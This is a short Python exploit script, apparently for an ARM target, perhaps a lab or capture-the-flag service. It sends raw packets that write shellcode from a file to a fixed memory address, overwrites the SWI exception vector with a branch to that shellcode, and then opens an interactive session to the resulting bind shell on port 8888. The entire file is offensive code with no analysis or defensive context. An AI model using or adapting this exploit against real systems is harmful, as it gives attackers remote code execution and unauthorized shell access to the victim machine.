#!/usr/bin/env python

import sys
import struct
import socket
import telnetlib
from scapy.all import *

PORT = 9999
IPADDR = "192.168.122.47"
SWI_VEC = 0xffff0008
STATIC_LOC = 0xffff0020

BRANCH = 0xea000004     # opcode for b 0x18

def send_data(data):
    global IPADDR,PORT
    pkt = IP(dst=IPADDR)/TCP(dport=PORT)/data
    send(pkt, verbose=0)

print "[+] Storing shellcode"
buf = struct.pack("<I", STATIC_LOC)
sc = open("sc.bin", "r").read()
buf += chr(len(sc))
buf += sc

# write shellcode to static location
send_data(buf)


print "[+] Overwriting SWI Vector"
# overwrite swi vector
buf = struct.pack("<I", SWI_VEC)
buf += chr(0x4)
buf += struct.pack("<I", BRANCH)

send_data(buf)

time.sleep(4)

print "[+] Connecting to bind shell"
s = socket.create_connection((IPADDR, 8888))
t = telnetlib.Telnet()
t.sock = s
t.interact()
